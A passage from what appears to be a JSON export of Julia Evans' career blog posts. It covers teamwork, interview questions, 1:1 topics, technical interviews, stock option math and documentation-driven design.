thought! \n\n For this one my manager at the time helped me a lot – I said “hey, I want to\nwrite a job description for our org”, and he told me “awesome, here’s who I you\nneed to talk to to get that done!” and gave me some useful advice. It didn’t\nmatter that I’m not a manager or team lead or anything which I thought was\ncool. \n\n better documentation \n\n Until recently my team didn’t have that much documentation for the infrastructure /\ntooling we maintain. There were a lot of things that lots of people knew, and\nthat if you asked someone they would definitely explain to you, but just\nweren’t… written down anywhere. I made it one of my personal goals this quarter\nto improve our documentation a lot. So I’ve written a bunch of documentation\nmyself, sometimes I’ll pair with someone to document a system that needs\nit, and other people have been writing new docs too. I’m excited about it and I\nthink it’s easier for a new person to come in and start reading to learn how\nour systems work than it was 6 months ago. \n\n As an example of something that  didn’t  work that well: when I joined, I\nwanted to make our documentation better, but I think I tried to make changes / ask people to make changes\nkind of all over the place and it was too scattered. Doing it in a more focused\nway (“I’m just going to document stuff on my team”) has been a lot better. \n\n some changes are too big, though! \n\n I spent some time last year advocating for us having concrete goals around\nmaking the engineering team more diverse. We did end up setting some goals, but\nI don’t know whether I made a difference at all – some things really do need\nsomeone higher up to decide them. (I actually think the approach they came up\nwith is pretty cool, but it is not my thing to write about here) \n\n So while there are lots of changes you can make by leading by example and from\nthe bottom up, this approach definitely doesn’t work for everything. \n\n you can make changes, maybe \n\n Not all of the changes I’ve tried have worked (and I’ve left out the things that\nhaven’t worked :)), so this is a pretty optimistic view. But I really do\nthink that software engineers at tech companies sometimes have a bunch of\ninfluence, and if I do the work to help make the change happen, sometimes\nthings can be a little bit different! I see a lot of other individual software\nengineers making changes to make things on their teams a little better and I\nthink it’s awesome. All companies are a work in progress and things cannot be\ngood unless we make them that way together :) \n\n Some things that have helped me: \n\n \n Work on one thing at a time. I have a regular engineering job to do, so I only do one “side project” like this at once. So if I’m working on organizing an event, I’m not allowed to write a job description. \n Doing the work myself to start is easier than asking somebody else to change how they’re doing something. \n Trying small changes first. Even if what I want is for all of our interviews to have standard evaluation guidelines (today that’s true!!), I can’t make that happen all at once, it’s easier to say “ok, I’m just going to make some guidelines for myself to use”. \n Work with other people! \n Remember my coworkers are probably on the same side as me :) \n \n\n Some other examples of making this kind of change: \n\n \n Sumana Harihareswara’s great post  Implementing the Friendly Space Policy for Wikimedia Foundation technical events \n \n\n"},
{"url": "https://jvns.ca/blog/2017/01/13/how-do-you-make-an-awesome-team/", "title": "How do you make an awesome team?", "content": "\n     \n\n I was talking to my awesome friend Amy Hanlon (who is a software engineer at Venmo) about teams!! \n\n She was talking about how she loves her team, and how she tries to make her team an awesome team to work on. I thought the idea that you can make your team awesome as a team  member  (not as a manager!) was really awesome, and I wanted to know how she does it! She told me what she does, and I thought it was so interesting that I wanted to tell you. \n\n Talk a lot about your work in a public channel \n\n She said that her team has a public (to the company) Slack channel, and that probably 95% of her communication with other people on her team is in that channel. Awesome things about this: \n\n \n if you put what you’re working on in public, sometimes someone will know a key piece of information that can really help you! Sometimes people will come in and say something that’s  not  helpful, but on the balance we think it’s worth it to talk in public :) \n if you talk about decisions in public all the time, everyone feels like they know what’s involved in the decision making process! \n if you write down what you’re struggling with and then write down how you fixed it (even if you fix it yourself) then people can learn from what you found! \n \n\n Ask a lot of questions in public \n\n Asking questions in public is a super awesome thing to do! Some questions you can ask of your team: \n\n \n How should we be doing X? \n What should we be working on? What should our priorities this year be? \n Is X or Y a better way to do this thing? why? \n \n\n Scheduling brainstorming meetings \n\n So the first two things – talk in public, and ask questions are things that I kinda do, sometimes. But a thing that I  never  do that she talked about is – scheduling brainstorming meetings with her team! These meetings are pretty small (maybe 4 people). I thought this was cool because setting aside time to talk about how we should do something is something I haven’t proactively done a lot, but I think it could be really helpful! \n\n It’s really important to come in with an open mind to these brainstorming meetings – we agreed that we don’t think that our initial ideas about a thing are usually right (“I’m probably wrong 70% of the time”). If I’m not attached to the first idea that I come up with, then we can come to better ideas! \n\n When having a discussion, talk like you might be wrong \n\n Amy reminded me that this is a thing I want to do more! \n\n Suppose we’re trying to decide whether to do X or Y. Let’s say I think that Y is probably the best thing. There are two ways i could approach this: \n\n \n I think Y is better, explain to me why that is not right \n I don’t understand yet why X might be better, but probably you have some different knowledge / assumptions than me, can you help me understand? \n \n\n Coming into a discussion with the attitude “I don’t know if I’m right, I’m\nready to change my mind” (and really honestly believing that) has been really\nreally helpful to me – a lot of the time I  do  need to change my mind, and\nI think it’s just a much more productive way. \n\n I do not always manage to do this, but I am trying to get better at it and I\nthink it’s an important part of team-building / working well with others. \n\n Don’t forget you have power over how your team is \n\n This conversation was super inspiring to me because – I sometimes think of\nteams as kind of a static thing, like either “this team is working well\ntogether” or “this team isn’t working well together, I don’t know how to fix\nit”. But of course I am a member of the team, and it is partly my job to help\nmake that team awesome! \n\n I tried to argue to my manager a while ago “i can’t make my team more awesome,\nI don’t know how!“. I think I was probably wrong to argue that – like\nmaking teams more awesome is not trivial but I think it is something I have\ndone before, at least a little, and something I would like be even better at\nin the future. \n\n Most of these things are things I already believe (“admitting you might be\nwrong is important”, “asking questions in public is helpful”), but want to get\nbetter at putting into practice more often and maybe more loudly :) \n\n (and of course, this post itself is a public question: how do  you  make\nan awesome team? :)) \n\n"},
{"url": "https://jvns.ca/blog/2013/12/30/questions-im-asking-in-interviews/", "title": "Questions I'm asking in interviews", "content": "\n     \n\n In a fit of “open source your interview process”, I tweeted yesterday\nwith the list of questions I’m drawing from when interviewing. A lot\nof people\n responded in the gist  with\namazing suggestions, and I thought I’d consolidate them here so they\ndon’t get lost in my pile of gists. \n\n My basic strategy is to spend 20 minutes before each interview I do\nand pick some appropriate questions from this list. I’ve tried to\ncategorize them a bit. A lot of these are outright stolen from\n Edward O’Campo-Gooding’s list of questions ,\nas well as from various people at\n Hacker School . I’d love suggestions for\nmore! \n\n Special thanks to  @bmastenbrook ,\n @marcprecipice ,\n @danluu ,\n @kelseyinnis ,\n @zmagg ,\n @graue , and\n @ircolle  for awesome question\nsuggestions. \n\n Edit:  A few more things: \n\n \n I don’t ask all of these in first interviews. Use your discretion,\nand do what you feel comfortable doing. \n Asking a lot of questions shows that you value yourself and that\nyou’re careful when making decisions. It’s a good thing. \n If you have an offer, you can schedule extra conversations if you\nfeel that not all of your questions have been answered. \n It can be worth asking the same question to more than one person. \n \n\n Engineering practices \n\n \n Do you test your code? \n How do you make sure that all code is understood by more than one\nperson? \n Do you do code review? Does all code get reviewed? \n Do you have an issue tracker? \n Describe your deployment process – how do you find bugs in your\nteam’s code? What recourse do you have when you find a serious bug\nin production code? \n Who is responsible for doing deployment? How often do you deploy? \n How do you think about code correctness? \n When something goes wrong, how do you handle it? Do devs get shamed\nfor breaking the build? \n How/when do developers talk to non-developers? Is it easy to talk to\nthe people who are will be using your product? \n Can I see some code the team I’m interviewing for has written? (from\nan open-source project you work on, for example) \n Who are the people at your company with a lot of depth of\nexperience? Will I be able to talk to them? \n What’s your approach to technical debt? \n \n\n Management style \n\n \n How does engineering work get assigned? \n How are technical decisions made and communicated? \n How do you balance support work and feature development? \n Can you give me an example of someone who’s been in a technical role\nat your company for a long time, and how their responsibilities and\nrole have changed? (I  love  this question) \n Do you have a dedicated designer? QA? Technical writer? Dev manager? \n How often do you have meetings? Are there any scheduled/standing\nmeetings? Who talks to customers (if appropriate) and how? \n Has there been a situation where someone raised an ethical concern?\nIf so, how was it handled? If not, have there really not been any? \n How are decisions made? Is architecture dictated top down? Are ideas\nfrom anyone welcomed? If so, in what scope/context? \n How are disagreements solved - both technical disagreements and\nother kinds? What happens when personalities clash? \n Can you tell me about a time when you’ve had to let someone go? \n Is there a written roadmap all developers can see? How far into the\nfuture does it extend? How closely is it followed? \n How is performance evaluated? \n \n\n Quality of life \n\n \n How much vacation do people get? If there’s “unlimited” vacation,\nhow much vacation do people normally take? \n Is it possible to take sabbaticals or unpaid vacation? \n How many women work for you? What’s your process for making sure you\nhave diversity in other ways? \n How many hours do people work in an average week? In your busiest\nweeks? \n Is variability tolerated or is everyone expected to be on the same\nschedule? \n What time do people normally leave work? \n Would I need to be on call? How often? \n How often are there emergencies or times when people have to work\nextra hours? \n What is your turnover rate like? How many devs were hired last year\nand how many left? \n What’s your retention rate of women over 1.5 years? Do you think you\ncould have done anything differently to keep people who left? \n Do people work on the weekend? \n Do people check in when they’re on vacation? How often? \n Is it possible to work from home, say, 1 or 2 days a week? Does\nanyone do this? (can be a nice option to have) \n Does this position require travel? How often? \n \n\n As many of these as possible are “statistical” questions – a company may say that they “don’t have hours”, but if everyone leaves at 9pm that’s not a good sign. \n\n Community involvement \n\n \n Do you contribute to open source projects? Which projects? Which teams work on open source?\nDo you work mostly in the community or do you have a private fork? \n Do your employees speak at conferences about your work? \n \n\n Career development \n\n \n Are employees encouraged to go speak at conferences? \n Do you cover travel to conferences? How many conferences a year do\ndevs typically go to? \n Does your company support continuing education? (will they pay for\nemployees to do a master’s degree?) \n In what other ways do you support career development? \n \n\n Culture \n\n \n How do you determine if someone is a poor fit for your company? \n How are your teams structured? What is the management structure\nlike? \n How often do you pair? What’s pairing like? How often do\ninexperienced people work directly with experienced people? \n What’s the onboarding process like? \n Is there any sort of institutionalized way of dealing with\nplateauing or preventing burnout? (Expecting to hear about rotation\nof duties or location, sabbaticals.) \n Is it easy to move to other divisions or offices? \n How does internal communication work? This one is super important\nand I need to remember to ask it more. \n Are there catered suppers? (possibly bad) \n How many hours a week does senior management work? Do they put in\n80-hour weeks? \n \n\n Financials/business model/growth \n\n \n Are you profitable?\n\n \n if not, how does this affect what you can do? What’s your\nplanned timeline for becoming profitable? \n \n How do you make money? (I often explain to my parents or\nnon-technical friends companies’ business models to test if they\nreally make sense.) \n How much are you planning to hire in the next year? \n Are company financials, minus salaries, transparent throughout the\ncompany? \n \n\n Things to look for in real life \n\n \n How is the office space physically organized? \n \n\n Other \n\n \n Can you tell me about how the interview process is structured? How\nmany interviews are there? \n How often do you offer above asking? Can I speak with someone who\ngot such an offer? \n What do you wish you had known when you joined this company? \n Why did you choose to join this company? \n What’s the single biggest issue or problem facing the\nteam/department/company?” What’s currently being done to address it? \n \n\n"},
{"url": "https://jvns.ca/blog/2015/03/28/senior-engineering-and-fantasy-heroes/", "title": "Senior engineering & fantasy heroes", "content": "\n     \n\n I was talking to someone at work this past week about what I’d want out\nof a senior engineer, and found myself inventing characters I’d like to\nwork with (and I already work with people who remind me of all of these,\nof course! <3). Maybe someone will find this bit of silliness enjoyable\n:). It’s about how fortune tellers do not necessarily also need to be\ncattle wranglers. \n\n (apparently I think gardeners are fantasy heroes) \n\n In very related excellence,  Camille Fournier  posted Rent the Runway’s\nengineering ladder in this  blog post  and\n spreadsheet \nwhich lays out engineering qualities they value in terms of\nstrength/dexterity/wisdom/charisma <3 \n\n The fortune teller \n\n The fortune teller can tell the future about your engineering project.\nYou tell her a design decision you’re making; she tells you the problems\nyou’re going to run into in 3 months. She saves you an incredible amount\nof engineering effort in bad directions. \n\n The cattle wrangler \n\n You have a team, and you need to standardize how your programs do an\nImportant Thing. Everyone wants to standardize, and nobody can agree on\nwhat the standard should be. The cattle wrangler is amazing at working\nthrough the pros and cons, and getting everyone to feel heard & agree on\na standard. \n\n The spring of knowledge \n\n Your company uses a lot of Java, and sometimes you need to know some\nobscure internal JVM detail. And all of your internet searching is\nbringing up… nothing. When you do, you go to the spring of Java\nknowledge, which tells you what you need to know. \n\n (What you need to know is not always the answer to the question you\nasked) \n\n The gardener \n\n You built a project full of technical debt and spiky bits? You go to the\ngardener for help, and sheepishly ask them to help you clean it up a\nbit. They show you where the nastiest weeds are, suggest code that you\ncould delete, and help you get to a better architecture in a reasonable\namount of time. They’re great to have on your side at the beginning of a\nproject, before you create the technical debt in the first place :) \n\n If you have more characters you work with & love, tell me!\n @b0rk  on Twitter. \n\n"},
{"url": "https://jvns.ca/blog/2015/03/06/1-1-topic-ideas/", "title": "1:1 topic ideas", "content": "\n      Danielle Sucher started this  great thread on twitter \nasking for ideas for what to talk about in 1:1s with your manager. I’m writing\nsome of them up here so I don’t forget. \n\n \n What’s happening now that I would like to not be happening in a month? (@zmagg) \n Am I having tension with any of my colleagues I want to resolve before it gets worse? \n what are promotions for? where am I relative to that, and what should I be working on? \n or: “This is how I would like promotions to work when they happen. How would I fit in to that if they did?” \n turn it around: what are  you  thinking about right now? what’s your top\npriority? what’s worrying you about this team? \n Am I happy with my current project? \n Do I feel like I’m learning? Are there things I feel like I’m  not  learning\nthat I would like to? \n Are there things about the way the team is working together that feel bad to me? \n periodically: where do I want to be with my career? \n \n\n There’s this further list of  101 questions to try  that I find really really helpful as an exhaustive grab bag of “oh no I don’t know what to talk about give me ideas please!!!”. \n\n \n\n ideas for how to think about 1:1s more generally: \n\n \n If I’d be comfortable talking about it in front of all my coworkers, don’t\ntalk about that. (@zmagg, @mrb_bk) \n It is SO EASY to forget everything that was bothering me when I get to a 1:1.\nKeep a shared list throughout the week! TONS of people said that they keep some\nkind of list of things to bring up in their 1:1 meetings and I reeeally want to\ntry it now. \n Keep track of what we’ve talked about in previous weeks to see if there are\nany patterns! Maybe in a shared list, so we can easily see “oh we haven’t\ntalked about careers in 3 months! let’s talk about that this week!” \n \n\n Some links: \n\n \n Conducting Effective and Regular One-on-Ones \n Creating alignment and resolving conflict: how the best managers run amazing teams \n The best 30 minutes you’ll spend this week: how to do a one-on-one that really counts \n The Update, The Vent, and The Disaster \n 101 Questions to Ask in One on Ones \n \n"},
{"url": "https://jvns.ca/blog/2014/02/03/sounding-confident-in-interviews/", "title": "Sounding confident in interviews", "content": "\n      Confession: I am often terrible at sounding confident. I have been\nknown to answer questions like “do you know statistics?” with “no, I\ndon’t know anything about statistics”, followed by an eventual\nadmission of “well except that I have a math degree and I know at\nleast what a biased estimator is and a whole bunch of probability and\nI did a bunch of Bayesian stats in my last job and…“. \n\n So, I struggle with underselling myself, and I forget sometimes that\n“I don’t have a PhD in this” isn’t the same as “I don’t know\nanything”. \n\n Some strategies I’ve been using: \n\n \n\n 1. Being factual. \n\n If someone asks me how familiar I am with Linux, I  could  say “well,\nI know enough, I think, probably, kind of”. Instead now I say “I’ve\nbeen using it every day for 10 years.“, which is not an exaggeration,\nand doesn’t undersell my experience. \n\n I find saying how long I’ve been using a technology and talking\nbriefly about what kinds of projects I’ve done with it easier (and\nmore helpful to the interviewer) than giving any kind of value\njudgment on my experience (I am a wizard!). \n\n 2. Pretend that they actually don’t know the answer to the question \n\n This of course don’t mean be condescending. Pretend that they don’t\nknow the answer, but that they’re  really really smart . \n\n Someone asked me what a filesystem was. I floundered for a second\nhere, and then remembered this principle! Then I answered something\nlike “Well, on a hard drive you have a bunch of binary data, and a\npriori it’s not organized in any particular way, which makes it hard\nto find the data you need. Filesystems are a way of organizing all\nthat data, typically into a directory tree, so that you can find\nthings!” \n\n 3. Saying what I do know, instead of what I don’t know \n\n Someone asked me what I knew about making database systems more\nreliable. I  could  have said “oh, I don’t know anything!”. \n\n Instead I said “Well, I know that people use replication and sharding.\nI haven’t worked much with either of these, but I think replication is\n…. and sharding is …“. \n"},
{"url": "https://jvns.ca/blog/2014/01/16/what-my-technical-interviews-have-looked-like/", "title": "What my technical interviews have looked like", "content": "\n      In the last month I’ve done what feels like 100 interviews. It’s\neasier than I thought it would be. I’m getting much better at talking\nabout myself to strangers on the phone, which is an awesome thing to\nbe able to practice. It’s also interesting to see different approaches\nto interviewing and get a feel for the culture at the companies. \n\n I feel like at some point someone’s going to ask me what kind of\nquestions get asked in technical interviews. So here are some\nanecdotes. This is probably from 15-30 technical interviews / phone\nscreens, across a bunch of tech companies of different sizes. (the\nnumber depends on how you count interviews) \n\n \n\n Questions about my background \n\n Most people ask me variations on these questions: \n\n \n Tell me a bit about your background. \n Tell me a bit about Job X (from my resume) \n What are you looking for in a job? \n Do you have any questions for me? \n \n\n I was originally pretty intimidated by all these questions, but I\nthink they’re actually a gift (if initially a difficult gift). \n\n “Tell me about your background”  gives you a chance to tell a story\n  about your career so far and explain where you’re coming from a\n  little bit. I find it useful enough that now if somebody doesn’t\n  ask, I’ll often say “alright, let me tell you a bit about where I’m\n  coming from” at the beginning of a first phone interview with a\n  company. I probably talk for 2-5 minutes. \n\n For me this looks like “I went to school and I did X, and then I\nwanted to change it up a bit so I did a job doing Y, but I wanted a\nbit more Q in my career so I switched to industry Z”. It’s good to\ntalk about your accomplishments here. \n\n For  “Tell me a bit about [Job X]” , I make sure I can talk about\nprojects I worked on at each of my previous jobs in an engaging way.\nI’ve also had people ask me about my master’s thesis, so I make sure I\ncan explain that. \n\n Some good things to talk about would be \n\n \n What was the goal of the project? \n What was interesting about the project? \n What did you accomplish? Why was it a success? \n \n\n What are you looking for in a job?  is a bit tough to give pithy\n  answers to, but good! It’s also a good thing to think about for\n  myself, so preparing for a question like this is definitely a good\n  use of time. \n\n Do you have any questions for me?  is something I’ve thought about\n  a lot, and wrote about in\n   Questions I’m asking in interviews .\n  I may write more about this later because it’s really important and\n  I find it pretty hard to get right. \n\n Technical questions \n\n I’ve been asked exactly zero tricky math questions or questions like\n“How many bingo balls could fit in the Empire State Building”.\nHopefully the tech industry has gotten over these. \n\n Here are some kinds of questions people have asked me: \n\n \n I saw  Rust  on your resume! That sounds\ncool! Tell me about it! \n Tell me what happens when you go to\n http://google.com , in as much detail as you\ncan. \n Write code to solve this [non-tricky but not trivial] algorithm\nprogram. (either in a Google doc or write code that will actually\nrun on my computer) \n Tell me more about your\n TCP stack ! (+ more followup\nquestions) \n Statistics questions, when applying for jobs that involve data\nanalysis. Bayes’ theorem and things. \n How would you approach [machine learning problem]? \n Tell me about some performance problems you’ve dealt with and what\nyou did. \n Algorithm question, and\n\n \n Tell me an algorithm for this. \n Talk about the complexity. \n How long do you think this would actually take to run, on a\nbillion numbers? (seconds/minutes/hours?) \n \n What do you know about distributed systems / concurrency? (+ some\nfollowup) \n What databases have you used? (+ some questions about database\ndesign and query runtime) \n What does  D3  do? What have you used it for?\nWould you recommend using it for X? \n Tell me about a project you did with\n[specific technology from my resume] \n Build a small class that does [thing]. \n Let’s pair and fix a bug in a library! \n Let’s pair and write a simple classifier and evaluate it! \n Bring some code you’ve written and explain it to someone. \n Write down code to do [thing] on a whiteboard. (only in one\ninterview, so far). \n Some C-specific questions \n Talk about a project you did where something was hard. \n \n\n Mostly nobody has asked me \n\n \n whiteboard coding \n specific questions about how a programming language works \n \n\n I think people are replacing “how many golf balls can fit in the\nEmpire State Building” with more concrete questions about estimating\nprogram runtime and space requirements. I am very happy about this. \n\n One takeaway from all this is that having weird things like Rust and\nJulia on my resume has been a fun time – people ask about Rust a lot,\nand I get to have good conversations about it. They are in a short\n“things I know a little bit about” section on my resume and it is\ngreat. \n"},
{"url": "https://jvns.ca/blog/2014/04/27/stopping-to-think/", "title": "Stopping to think", "content": "\n      A while ago I had a bug in my code. I was frustrated because I\ncouldn’t get into a debugger to get more information – I needed to\nknow more to understand what was going on! I went home, sad. \n\n On my way back in the morning, I thought about the error message I’d\nseen. I realized I didn’t need more information! What I had was\nenough, and I knew how to fix it. I’d like to remember to step back\nand think more often and more quickly. \n\n"},
{"url": "https://jvns.ca/blog/2015/12/30/do-the-math-on-your-stock-options/", "title": "Things you should know about stock options before negotiating an offer", "content": "\n     \n\n Are you considering an offer from a private company, which involves stock options? Do you think those stock options might be worth something one day? Are you confused? Then read this! I’ll give you some motivation to learn more, and a few questions to consider asking your prospective employer. \n\n I polled people on Twitter and 65% of them said that they’ve  accepted an offer without understanding how the stock options work . \n\n I have a short story for you about stock options. First: stock options are BORING AND COMPLICATED AND AWFUL. They are full of taxes, which we all know are awful. Some people think they’re fun and interesting to learn about. I am not one of those people. However, if you have an offer that involves stock options, I think you should learn a little about them anyway.\nAll of the following assumes that you work for a private company that is still private when you leave it. \n\n In this post I don’t want to explain comprehensively how options work. (For that, see  how to value your startup stock options  or  The Open Guide to Equity Compensation\n ) Instead I want to tell you a story, and convince you to ask more questions, do a little research, and do more math. \n\n I took a job 2 years ago, with a company with a billion-dollar-plus valuation. I was told “we pay less than other companies because our stock option offers are more generous”. Okay. I understood exactly nothing about stock options, and accepted the offer. To be clear: I don’t  regret  accepting the offer (my job is great! I ❤ my coworkers). But I do wish I’d understood the (fairly serious) implications at the time. \n\n From my offer letter: \n\n \n the offer gives you the option to purchase [redacted]\nshares of Stripe stock. [We bias] our offers to\nplace weight on your ownership in the company. \n\n I’m happy to talk you through how we think about the value of the\noptions. As far as numbers: there are approximately [redacted]\noutstanding shares. We can talk in more detail about the current valuation and the strike price for your options. \n \n\n This is a good situation! They were being pretty upfront with me. I had access to all the information I needed to do a little math. I did not do the math. Let me tell you how you can start with an offer letter like this and understand what’s going on a little better! \n\n what the math looks like (it’s just multiplication) \n\n The math I want you to do is pretty simple. The following example stock option offer is not at all my situation, but there are some similarities that I’ll explain in a minute. \n\n The example situation: \n\n \n stock options you’re being offered: 500,000 \n vesting schedule: 4 years. you get 25% after the first year, then the rest granted every month for the remainder of the time. \n outstanding shares: 100,000,000 (the number of total shares the company has) \n company’s current valuation: 1 billion dollars \n \n\n This is an awesome start. You have options to buy 0.5% of the shares of a billion dollar company. What could be better? If you stay with the company until it goes public or dies, this is easy. If the company goes public and the stock price is more than your exercise price, you can exercise your options, sell as much of the stock as you want to, and make money. If it dies, you never exercise the options and don’t lose anything. win-win. This is where options excel. \n\n However! If you want to  ever  quit your job (in the next 5 years, say!), you may not be able to sell any of your stock for a long time. You have more math to do. \n\n ISOs (the usual way companies issue stock options) expire 3 months after you quit. So if you want to use them, you need to buy (or “exercise”) them. For that, you need to know the exercise price. You also need to know the fair market value (current value of the stock), for reasons that will become apparent in a bit. We need a little more data: \n\n \n exercise price or strike price: $1. (This is how much it costs, per share, to buy your options.) \n current fair market value: $1 (This is how much each share is theoretically worth. May or may not have any relationship to reality) \n fair market value, after 3 years: $10 \n \n\n All this is information the company should tell you, except the value after 3 years, which would involve time travel. Let’s see how this plays out! \n\n time to quit \n\n Okay awesome! You had a great job, you’ve been there 3 years, you worked hard, did some great work for the company, you want to move on. What next? Since your options vested over 4 years, you now have 375,000 options (75% of your offer) that you can exercise. Seems great. \n\n Surprise! Now you need to pay hundreds of thousands of dollars to invest in an uncertain outcome. The outcomes (IPO, acquisition, company fails) are all pretty complicated to discuss, but suffice to say: you can lose money by investing in the company you work for. It may be a good investment, but it’s not risk-free. Even an acquisition can end badly for you (the employee). Let’s see exactly how it costs you hundreds of thousands of dollars: \n\n Pay the exercise price : \n\n The exercise price is $1, so it costs $375,000 to turn your options into stock. Your options go  poof  in three months, but you can keep the stock if you buy it now. \n\n What?! But you only have 300k in the bank. You thought that was… a lot. You make an amazing salary (even $200k/year wouldn’t cover that). You can still afford a lot of it though! Every share costs $1, and you can buy as many or as few as you want. No big deal. \n\n You have to decide how much money you want to spend here. Your company hasn’t IPO’d yet, so you’ll only be able to make money selling your shares if your company eventually goes public  AND  sells for a higher price than your exercise price. If the company dies, you lose all the money you spent on stock. If the company gets acquired, the outcome is unpredictable, and you could still get nothing for all the money you spend exercising options. \n\n Also, it gets worse: taxes! \n\n Pay the taxes : \n\n The value of your stock has gone up! This is awesome. It means you get the chance to pay a lot of taxes! The difference in value between $1 (the exercise price) and $10 (the current fair market value) is $9. So you’ve potentially made $9 * 375000 = 3.3 million dollars. \n\n Well, you haven’t actually made that, since you’re buying stock you can’t sell (yet). But your local tax agency  thinks  you have. In Canada (though I’m not yet sure) I might have to pay income tax on that 3 million dollars, whether or not I have it. So that’s an extra 1.2 million in taxes, without any extra cash. \n\n The tax implications are super boring and complicated, and super super important. If you work for a successful company, and its value is increasing over time, and you try to leave, the taxes can make it totally unaffordable to exercise your options. Even if the company wasn’t worth a lot when you started! See for instance  this person describing how they can’t afford the taxes on their options . Early exercise can be a good defense against taxes (see the end of this post). \n\n my actual situation \n\n I don’t want to get too far into this fake situation because when people tell me fake situations, I’m like “ok but that’s not real why should I care.” Here’s something real. \n\n I do not own 0.5% of a billion dollar company. In fact I own 0%. But the company I work for  is  valued at more than a billion dollars, and I  do  have options to buy some of it. The options I’m granted each year would cost, very roughly, $100,000 (including exercise prices + taxes). Over 4 years, that’s almost half a million dollars. My after-tax salary is less than $100,000 USD/year, so by definition it is impossible for me to exercise my options without borrowing money. \n\n The total amount it would cost to exercise + pay taxes on my options is more than all of the money I have. I imagine that’s the case for some of my colleagues as well (for many of them, this is their first job out of school). If I leave, the options expire after 3 months. I still do not understand the tax implications of exercising at all. (it makes me want to hide under my bed and never come out) \n\n I was really surprised by all of this. I’d never made a financial decision much bigger than buying a $1000 plane ticket or signing a lease before. So the prospect of investing a hundred thousand dollars in some stock? Having to pay taxes on money that I do not actually have? super scary. \n\n So the possibilities, if I want to ever quit my job, are: \n\n \n exercise them somehow (with money I get from ??? somewhere ???). \n give up the options \n find a way to sell the options or the resulting stock \n \n\n There are several variations on #3. They mostly involve cooperation from your employer – it’s possible that they’ll let you sell some options, under some conditions, if you’re lucky / if they like you / if the stars are correctly aligned. This post  How to sell secondary stock  says a little more (thanks  @antifuchs !).  This HN comment  describes a situation where someone got an offer from an outside investor, and the investor was told by the company to not buy from him (and then didn’t buy from him). Your employer has all the power. \n\n Again, this isn’t a disaster – I have a good job, which pays me a SF salary despite me living in Montreal. It’s a fantastic situation to be in. And certainly having an option to buy stock is better than having nothing at all! But you can ask questions, and I like being informed. \n\n Questions to ask \n\n Stock options are very complicated. If you start out knowing nothing, and you have an offer to evaluate this week, you’re unlikely to be able to understand every possible scenario. But you can do better than me! \n\n When I got an offer, they were super willing to answer questions, and I didn’t know what to ask. So here are some things you could ask. In all this I’m going to assume you work for a US company. \n\n Basic questions: \n\n \n how many stock options (# shares) \n vesting schedule (usually 4 years / 1 year “cliff”) \n how many outstanding shares \n company’s current valuation \n exercise price (per share) \n fair market value (per share: a made-up number, but possibly useful) \n if they’re offering ISOs, NSOs, or RSUs \n how long after leaving do you have to exercise? \n \n\n Then you can do some basic math and figure out how much it would cost to exercise the options, if you choose to. (I have a friend who paid $1 total to exercise his stock options. It might be cheap!) \n\n More ambitious questions \n\n As with all difficult questions, before you accept an offer is the best time to ask, because it’s when you have the most leverage. \n\n \n will they let you sell stock to an outside investor? \n If you can only exercise for 3 months after leaving, is that negotiable? ( pinterest gives you the option of 7 years and worse tax implications. can they do the same? ) \n If the company got sold for the current valuation (2X? 10X?) in 2 years, what would my shares be worth? What if the company raises a lot of money between now and then? \n Can they give you a summary of what stock & options other people have? This is called the “cap table”. (The reason you might want to know this: often VCs are promised that they’ll get their money  first  in the case of any liquidation event. Before you! Sometimes they’re promised at least a 3x return on their investment. This is called a “liquidation preference”  1 .) \n What other downside protection do the VCs have? (see  this article  for some of the possibilities) \n Do the VCs have participation? (there’s a definition of  participation and other stock option terms here ) \n Can you early exercise your options? I know someone who early exercised and saved a ton of money on taxes by doing it.  This guide  talks more about early exercising.  2 \n Do your options vest faster if the company is acquired? What if you get terminated? (these possibilities are called “single/double trigger”) \n \n\n If you have more ideas for good questions,  tell me!  I’ll add them to this list. \n\n #talkpay \n\n I think it’s important to talk about stock option grants! A lot of money can be at stake, and it’s difficult to talk about amounts in the tens or hundreds of thousands. \n\n There’s also some tension about this topic because people get very emotionally invested in startups (for good reason!) and often feel guilt about leaving / discussing the financial implications of leaving. It can feel disloyal! \n\n But if you’re trying to make an investment decision about thousands of dollars, I think you should be informed. Being informed isn’t disloyal :) The company you work for is informed. \n\n Do the math \n\n The company making you an offer has lawyers and they should know the answers to all the questions I suggested. They’ve thought very carefully about these things already. \n\n I wish I’d known what questions to ask and done some of the math  before I started my job, so I knew what I was getting into. Ask questions for me! :) You’ll understand more clearly what investment decisions might be ahead of you, and what the financial implications of those decisions might be. \n\n  Thanks for Leah Hanson and Dan Luu for editing help!  \n \n\n \n\n \n On liquidation preferences: Suppose a VC invests 100M, and is promised a 3x return on investment. If the company later sells for 300M (or less), the VC gets all of it and you get nothing. That’s it. Liquidation preferences are important to know about.\n  [return] \n On early exercise: I also know people who have  lost  a lot of money by early exercising, if it’s expensive and turns out to be worth nothing. The important thing is to understand what you’re allowed to do.\n  [return] \n \n \n\n"},
{"url": "https://jvns.ca/blog/2016/08/16/release-it-then-build-it/", "title": "Release it, then build it", "content": "\n      I did a cool fun exercise yesterday. I was writing a design document (which I\nam  learning to like doing ). \n\n To start it out, I wrote a “goals” section. But! Instead of writing down a\nlist of goals, instead I wrote a release email (“hi everyone! Today we’re\nannouncing [cool new feature]. This is what we did! This is why we did it!\nThis is how you use it!“) \n\n I found this pretty fun to write (releasing things is fun!) and I think it was\na reasonable way to explain the project’s goals at a high level in a clear\nway. For me I think this is kind of a weird brain hack – I sort of hate\nwriting down lists of project goals, but I love writing emails and blog posts\nthat explain cool new features to people. \n\n some things that I think are better about this than just writing a set of goals \n\n \n it’s fun (for me) \n it forces you to write down a narrative around your end goals, consider your target audience, and explain why what you’re doing is important \n it helps me feel more energetic about the project (“oh wow this is a good useful thing!”) \n it’s (possibly) easier for people to read and understand than a list of abstract goals \n \n\n Also I immediately got a bunch of helpful comments on the idea and some of the\nimplementation challenges we’d need to tackle! That was great. \n\n (This is not at all a novel idea, if you google “documentation driven development” you can read all kinds of people talking about similar things. But I like it!) \n\n"},
